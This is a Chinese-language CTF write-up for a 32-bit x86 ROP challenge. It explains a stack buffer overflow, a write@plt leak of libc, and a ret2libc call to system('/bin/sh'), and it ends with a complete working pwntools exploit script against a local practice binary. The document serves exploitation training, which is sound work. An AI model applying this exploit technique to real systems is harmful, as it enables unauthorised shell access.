# 一道简单的`x86 ROP PWN`

### 目标二进制程序checksec:
```
pwn3$ checksec level3 
[*] '/home/pwn/PWN/test/pwn3/level3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

### 另外，题目还给出了动态链接库
```
pwn3$ ldd level3 
	linux-gate.so.1 (0xf7f7f000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7d79000)
	/lib/ld-linux.so.2 (0xf7f80000)
pwn3$ file /lib/i386-linux-gnu/libc.so.6
/lib/i386-linux-gnu/libc.so.6: symbolic link to libc-2.31.so
```

### IDA对程序进行分析:
```
ssize_t vulnerable_function()
{
  char buf[136]; // [esp+0h] [ebp-88h] BYREF

  write(1, "Input:\n", 7u);
  return read(0, buf, 0x100u);
}
```

### 书写exp前段部分
```
#!/bin/python3

from pwn import *

context(log_level='debug',arch='i386',os='linux')

io=process('./level3')
elf=ELF('./level3')
libc=ELF('/lib/i386-linux-gnu/libc-2.31.so')
```

## 程序利用思路

IDA的分析结果给出了缓冲区的大小，以及调用了write和read函数

read处存在缓冲区溢出，但是由于程序的保护措施，需要进行ROP

而在程序中并不直接存在可利用的代码片段

因此需要在libc中寻找

由于目标程序调用了write函数，可以ret2plt调用write泄露远程地址

这里直接利用write函数泄露远程的write函数本身的地址

在完成溢出并根据传递给write函数的参数成功泄露出远程地址后，还需要再跳转到漏洞函数本身

由此就可以再次完成对程序控制流的劫持，也就是说能够反复进行溢出

于是，根据`x86架构`的传参方式，第一次溢出的payload应该书写为
```
溢出偏移量 + write函数plt地址 + 漏洞函数地址 + 1 + write的got表地址 + 4
```

得到返回的write地址之后，构造第二次溢出的payload
首先使用write地址减去在符号表中write的地址，就可以得到libc的基地址
有了libc的基地址，就可以求出system函数的地址和`/bin/sh`的地址

最终构造第二次溢出payload为
```
溢出偏移量+system函数地址+4字节垃圾数据+/bin/sh地址
```

最终进行溢出，getshell

## 完整exp：
```
#!/bin/python3

from pwn import *

context(log_level='debug',arch='i386',os='linux')

io=process('./level3')
elf=ELF('./level3')
libc=ELF('/lib/i386-linux-gnu/libc-2.31.so')

payload=cyclic(0x88+4)+p32(elf.plt['write'])
payload+=p32(elf.symbols['vulnerable_function'])
payload+=p32(1)+p32(elf.got['write'])+p32(4)
io.recvuntil(b'Input:\n')
io.sendline(payload)
write_addr=u32(io.recv(4))

libc_base=write_addr-libc.symbols['write']
system_addr=libc_base+libc.symbols['system']
bin_sh=libc_base+next(libc.search(b'/bin/sh'))
payload=cyclic(0x88+4)+p32(system_addr)+b'BBBB'+p32(bin_sh)
io.sendline(payload)
io.recvline()
io.interactive()
```

